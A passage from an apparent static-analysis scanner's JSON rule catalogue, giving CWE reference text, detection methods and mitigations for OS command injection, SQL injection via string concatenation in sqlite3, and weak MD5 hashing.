                  "PotentialMitigations": "::PHASE:Architecture and Design:DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).::PHASE:Implementation:DESCRIPTION:If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ; and \u003e characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components. Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Operation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.::PHASE:Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Use runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::",
                  "ObservedExamples": "::REFERENCE:CVE-2020-10987:DESCRIPTION:OS command injection in Wi-Fi router, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10987::REFERENCE:CVE-2020-10221:DESCRIPTION:Template functionality in network configuration management tool allows OS command injection, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10221::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-1999-0067:DESCRIPTION:Canonical example of OS command injection. CGI program does not neutralize | metacharacter when invoking a phonebook program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0067::REFERENCE:CVE-2001-1246:DESCRIPTION:Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1246::REFERENCE:CVE-2002-0061:DESCRIPTION:Web server allows command execution using | (pipe) character.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0061::REFERENCE:CVE-2003-0041:DESCRIPTION:FTP client does not filter | from filenames returned by the server, allowing for OS command injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0041::REFERENCE:CVE-2008-2575:DESCRIPTION:Shell metacharacters in a filename in a ZIP archive:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2575::REFERENCE:CVE-2002-1898:DESCRIPTION:Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1898::REFERENCE:CVE-2008-4304:DESCRIPTION:OS command injection through environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4304::REFERENCE:CVE-2008-4796:DESCRIPTION:OS command injection through https:// URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4796::REFERENCE:CVE-2007-3572:DESCRIPTION:Chain: incomplete denylist for OS command injection:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3572::REFERENCE:CVE-2012-1988:DESCRIPTION:Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-1988::",
                  "FunctionalAreas": "::Program Invocation::",
                  "AffectedResources": "::System Process::",
                  "TaxonomyMappings": "::TAXONOMY NAME:PLOVER:ENTRY NAME:OS Command Injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR02-C:ENTRY NAME:Sanitize data passed to complex subsystems::TAXONOMY NAME:WASC:ENTRY ID:31:ENTRY NAME:OS Commanding::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS07-J:ENTRY NAME:Do not pass untrusted, unsanitized data to the Runtime.exec() method::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-78::",
                  "RelatedAttackPatterns": "::108::15::43::6::88::",
                  "Notes": "::TYPE:Terminology:NOTE:The OS command injection phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an -exec switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX find command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.::TYPE:Research Gap:NOTE:More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.::"
                },
                "tags": [
                  "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                  "weakness",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "string-concat-in-sql-command-in-sqlite3-python",
              "name": "string-concat-in-sql-command-in-sqlite3-python",
              "shortDescription": {
                "text": "String concat in sql command in sqlite3"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/89.html",
              "help": {
                "text": "Detected string concatenation in SQL command, which is a bad practice and may allow SQL injection attacks"
              },
              "properties": {
                "cweId": "CWE-89",
                "cweInfo": {
                  "Name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
                  "WeaknessAbstraction": "Base",
                  "Status": "Stable",
                  "Description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.",
                  "ExtendedDescription": "Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands. SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or product package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.",
                  "RelatedWeaknesses": "::NATURE:ChildOf:CWE ID:943:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::",
                  "ApplicablePlatforms": "::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Database Server:TECHNOLOGY PREVALENCE:Undetermined::",
                  "ModesOfIntroduction": "::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:This weakness typically appears in data-rich applications that save user inputs in a database.::",
                  "CommonConsequences": "::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.::",
                  "DetectionMethods": "::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Database Scanners Cost effective for partial coverage: Web Application Scanner Web Services Scanner:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::",
                  "PotentialMitigations": "::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using exec or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name O'Reilly would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::",
                  "ObservedExamples": "::REFERENCE:CVE-2021-42258:DESCRIPTION:SQL injection in time and billing software, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-42258::REFERENCE:CVE-2021-27101:DESCRIPTION:SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-27101::REFERENCE:CVE-2020-12271:DESCRIPTION:SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12271::REFERENCE:CVE-2019-3792:DESCRIPTION:An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3792::REFERENCE:CVE-2004-0366:DESCRIPTION:chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0366::REFERENCE:CVE-2008-2790:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2790::REFERENCE:CVE-2008-2223:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2223::REFERENCE:CVE-2007-6602:DESCRIPTION:SQL injection via user name.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6602::REFERENCE:CVE-2008-5817:DESCRIPTION:SQL injection via user name or password fields.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5817::REFERENCE:CVE-2003-0377:DESCRIPTION:SQL injection in security product, using a crafted group name.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0377::REFERENCE:CVE-2008-2380:DESCRIPTION:SQL injection in authentication library.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2380::REFERENCE:CVE-2017-11508:DESCRIPTION:SQL injection in vulnerability management and reporting tool, using a crafted password.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-11508::",
                  "TaxonomyMappings": "::TAXONOMY NAME:PLOVER:ENTRY NAME:SQL injection::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:SQL Injection::TAXONOMY NAME:CLASP:ENTRY NAME:SQL injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:19:ENTRY NAME:SQL Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-89::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:IDS00-J:ENTRY NAME:Prevent SQL injection:MAPPING FIT:Exact::",
                  "RelatedAttackPatterns": "::108::109::110::470::66::7::",
                  "Notes": "::TYPE:Relationship:NOTE:SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors.::"
                },
                "tags": [
                  "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
                  "weakness",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "insecure-md5-in-hashlib-python",
              "name": "insecure-md5-in-hashlib-python",
              "shortDescription": {
                "text": "Insecure md5 in hashlib"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/328.html",
              "help": {
                "text": "Detected use of weak MD5 hash function, which should be avoided when there are security implications"
              },
              "properties": {
                "cweId": "CWE-328",
                "cweInfo": {
                  "Name": "Use of Weak Hash",
                  "WeaknessAbstraction": "Base",
                  "Status": "Draft",
                  "Description": "The product uses an algorithm that produces a digest (output value) that does not meet security expectations for a hash function that allows an adversary to reasonably determine the original input (preimage attack), find another input that can produce the same hash (2nd preimage attack), or find multiple inputs that evaluate to the same hash (birthday attack).",
                  "ExtendedDescription": "A hash function is defined as an algorithm that maps arbitrarily sized data into a fixed-sized digest (output) such that the following properties hold: 1. The algorithm is not invertible (also called one-way or not reversible) 2. The algorithm is deterministic; the same input produces the same digest every time Building on this definition, a cryptographic hash function must also ensure that a malicious actor cannot leverage the hash function to have a reasonable chance of success at determining any of the following: 1. the original input (preimage attack), given only the digest 2. another input that can produce the same digest (2nd preimage attack), given the original input 3. a set of two or more inputs that evaluate to the same digest (birthday attack), given the actor can arbitrarily choose the inputs to be hashed and can do so a reasonable amount of times What is regarded as reasonable varies by context and threat model, but in general, reasonable could cover any attack that is more efficient than brute force (i.e., on average, attempting half of all possible combinations). Note that some attacks might be more efficient than brute force but are still not regarded as achievable in the real world. Any algorithm does not meet the above conditions will generally be considered weak for general use in hashing. In addition to algorithmic weaknesses, a hash function can be made weak by using the hash in a security context that breaks its security guarantees. For example, using a hash function without a salt for storing passwords (that are sufficiently short) could enable an adversary to create a rainbow table [REF-637] to recover the password under certain conditions; this attack works against such hash functions as MD5, SHA-1, and SHA-2.",
                  "RelatedWeaknesses": "::NATURE:ChildOf:CWE ID:326:VIEW ID:1000::NATURE:ChildOf:CWE ID:327:VIEW ID:1000:ORDINAL:Primary::",
                  "ApplicablePlatforms": "::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::",
                  "ModesOfIntroduction": "::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::",
                  "CommonConsequences": "::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::",
                  "DetectionMethods": "::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::",
                  "PotentialMitigations": "::PHASE:Architecture and Design:DESCRIPTION:Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (stretching) or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use. Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead. Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.:EFFECTIVENESS:High::",
                  "ObservedExamples": "::REFERENCE:CVE-2022-30320:DESCRIPTION:Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30320::REFERENCE:CVE-2005-4900:DESCRIPTION:SHA-1 algorithm is not collision-resistant.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4900::REFERENCE:CVE-2020-25685:DESCRIPTION:DNS product uses a weak hash (CRC32 or SHA-1) of the query name, allowing attacker to forge responses by computing domain names with the same hash.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-25685::REFERENCE:CVE-2012-6707:DESCRIPTION:blogging product uses MD5-based algorithm for passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-6707::REFERENCE:CVE-2019-14855:DESCRIPTION:forging of certificate signatures using SHA-1 collisions.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-14855::REFERENCE:CVE-2017-15999:DESCRIPTION:mobile app for backup sends SHA-1 hash of password in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-15999::REFERENCE:CVE-2006-4068:DESCRIPTION:Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4068::",
                  "TaxonomyMappings": "::TAXONOMY NAME:PLOVER:ENTRY NAME:Reversible One-Way Hash::",
                  "RelatedAttackPatterns": "::461::68::",
                  "Notes": "::TYPE:Maintenance:NOTE:Since CWE 4.4, various cryptography-related entries including CWE-328 have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.::"
                },
                "tags": [
                  "CWE-328: Use of Weak Hash",
                  "weakness",
                  "security",
                  "medium"
                ]
              }
            }
          ],
          "version": "0.1.49"
        }
      },
